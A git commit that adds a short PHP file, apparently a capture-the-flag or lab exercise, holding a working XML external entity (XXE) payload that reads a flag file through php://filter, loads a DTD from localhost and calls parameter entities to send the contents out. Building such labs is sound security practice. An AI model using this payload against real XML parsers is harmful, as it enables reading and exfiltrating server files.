05c77b300be0fc5532077cab0145af9a0f48ab66
yaoyaodj <djfresh@163.com>
2020-05-18 11:44:25 +0800

    Create index.php

---
+++ phpxxe/index.php
@@ -0,0 +1,15 @@
+<?php 
+$xml=<<<EOF 
+<?xml version="1.0"?> 
+<!DOCTYPE ANY[ 
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/opt/flag/flag2"> 
+<!ENTITY % remote SYSTEM "http://localhost/phpxxe/test.xml"> 
+%remote;
+%all;
+%send; 
+]> 
+EOF; 
+$data = simplexml_load_string($xml) ; 
+echo "<pre>" ; 
+print_r($data) ; 
+?>
